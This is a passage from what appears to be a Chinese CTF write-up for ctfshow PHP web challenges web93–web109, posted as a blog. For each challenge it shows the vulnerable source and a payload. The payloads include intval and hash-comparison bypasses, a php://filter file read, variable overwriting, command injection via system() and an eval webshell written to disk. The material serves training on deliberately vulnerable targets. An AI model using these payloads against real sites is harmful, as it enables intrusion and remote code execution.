class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了字母</p><p>十六进制用不了，用八进制即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">010574</span></span><br></pre></td></tr></table></figure><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]/i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首个字符不能是0</p><p>这里可以利用精度来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=<span class="number">4476.00</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br></pre></td></tr></table></figure><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-z]|\./i"</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了点号，依旧有办法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br><span class="line">%<span class="number">20</span>空格占去头个字符，依旧可以用进制绕过</span><br></pre></td></tr></table></figure><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'u'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'u'</span>]==<span class="string">'flag.php'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">'u'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能匹配到flag.php，用伪协议绕过读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">u=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'a'</span>] != $_POST[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MD5强比较，数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_COOKIE:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_SERVER:<span class="string">'flag'</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>?$flag:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察三目运算符以及地址引用传值</p><p>这里要求传给<code>HTTP_FLAG</code>的值为flag</p><p>只要通过GET传递的参数都会被POST传递的覆盖</p><p>也就是说不仅仅要GET传值给<code>HTTP_FLAG</code>,同时用POST传递相同的值</p><p>方便理解，改一下形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>($_GET)&#123;</span><br><span class="line">$_GET=&amp;$_POST;<span class="comment">//GET传值都会被POST覆盖</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">$_GET=&amp;$_COOKIE;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">$_GET=&amp;$_SERVER;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>);<span class="comment">//获取flag的条件</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:HTTP_FLAG=flag</span><br><span class="line">POST:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>学习到了新东西，快乐了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));<span class="comment">//写入数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'n'</span>]) &amp;&amp; in_array($_GET[<span class="string">'n'</span>], $allow))&#123;</span><br><span class="line">    <span class="comment">//in_array函数漏洞，当第三个参数未设置时，会把文件名后缀去除，也是就保留前面部分</span></span><br><span class="line">    file_put_contents($_GET[<span class="string">'n'</span>], $_POST[<span class="string">'content'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组里被压入了一些数字，必须保证传入的n包含数字才能够写入文件</p><p>开始以为是只要包含数字就可以，其实不然，分析放在上面了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:n=<span class="number">13.</span>php</span><br><span class="line">POST:content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后选择蚁剑连接或是直接读取都可</p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/\;/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要满足v1是数字即可，还必须包括分号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span>&amp;v3=;system(<span class="string">'ls'</span>);;</span><br></pre></td></tr></table></figure><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">'v1'</span>];</span><br><span class="line">$v2=$_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3=$_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用函数打印对象里面的属性，这里有一个Reflectionclass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">通过ReflectionClass，我们可以得到Person类的以下信息：</span><br><span class="line"><span class="number">1.</span>常量 Contants</span><br><span class="line"><span class="number">2.</span>属性 Property Names</span><br><span class="line"><span class="number">3.</span>方法 Method Names静态</span><br><span class="line"><span class="number">4.</span>属性 <span class="keyword">Static</span> Properties</span><br><span class="line"><span class="number">5.</span>命名空间 <span class="keyword">Namespace</span></span><br><span class="line">6.Person类是否为final或者abstract</span><br><span class="line"><span class="number">7.</span>Person类是否有某个方法</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与web103相同，直接看103的分析</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);<span class="comment">//is_numeric函数判断是否为数值，并进行与运算</span></span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);<span class="comment">//截取第二个字符之后所有的内容</span></span><br><span class="line">    $str = call_user_func($v1,$s);<span class="comment">//调用函数</span></span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/.*p.*h.*p.*/i"</span>,$str))&#123;<span class="comment">//过滤php后缀名</span></span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sorry'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个注意点，就是在php7中</p><img src="/2020/09/25/PHPcharacter/1.png" class=""><p>所以这里不能用16进制绕过了</p><p>这道题看的出题人的payload，小小疑问，太需要运气了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2=<span class="number">225044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=g.php</span></span><br><span class="line">POST:v1=hex2bin</span><br><span class="line"></span><br><span class="line"><span class="comment">//详细说说</span></span><br><span class="line"><span class="comment">//v2是先经过base64再hex加密的shell，原型是<span class="meta">&lt;?</span>=`cat *`;</span></span><br><span class="line"><span class="comment">//说要运气是v2中刚好只有一个e，就是科学计数法，也就是数值了</span></span><br><span class="line"><span class="comment">//v3用伪协议</span></span><br><span class="line"><span class="comment">//v1的hex2bin是为了将16进制转化回ascii字符，前面的22是加的，绕过substr的截断</span></span><br></pre></td></tr></table></figure><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//没get到考点，应该是出题人可能少打了个‘=’，传一样的值就行</span></span><br></pre></td></tr></table></figure><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">'你还想要flag嘛？'</span>;</span><br><span class="line">$suces=<span class="string">'既然你想要那给你吧！'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">'error'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'flag'</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"your are good"</span>.$flag.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br></pre></td></tr></table></figure><p>经典变量覆盖，开始没找到点，后来出题师傅说要用<code>die($error)</code>,这就懂了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">POST：error=$flag&amp;flag=$$flag</span><br><span class="line">GET：$flag=flag</span><br><span class="line">分析：</span><br><span class="line">post：</span><br><span class="line">error=$flag=&gt;$error=$$flag</span><br><span class="line">要让$error=$flag拿到flag，这一步的前提是$_POST[<span class="string">'flag'</span>]!=$flag</span><br><span class="line">get:</span><br><span class="line">$flag=flag=&gt;$$flag=$flag</span><br><span class="line">post:</span><br><span class="line">flag=$$flag</span><br></pre></td></tr></table></figure><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2[]=<span class="number">2</span></span><br><span class="line">POST:v1[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       <span class="keyword">if</span>($v2[<span class="string">'flag'</span>]==md5($v3))&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str()</code>变量覆盖，MD5相等只需要找到加密后以<code>0e</code>开头，纯数字的即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">GET:v3&#x3D;240610708</span><br><span class="line">POST:v1&#x3D;flag&#x3D;0e1</span><br></pre></td></tr></table></figure><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z]+$"</span>, $_GET[<span class="string">'c'</span>])===<span class="keyword">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">'c'</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能出现字母，并且字符串倒序取整的值，<code>%00</code>截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">c&#x3D;a%00778</span><br></pre></td></tr></table></figure><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v1) &amp;&amp; preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用到了异常类，看到格式想着是类，但是没有想到抛出异常类，问了羽师傅，拿到了payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">1.</span>v1=<span class="keyword">Exception</span>;system(<span class="string">"cat%20fl36dg.txt"</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line"><span class="number">2.</span>v1=<span class="keyword">Exception</span>;<span class="comment">//&amp;v2=system("cat%20fl36dg.txt");</span></span><br></pre></td></tr></table></figure><h3 id="web110"><a href="#web110" class="headerlink" 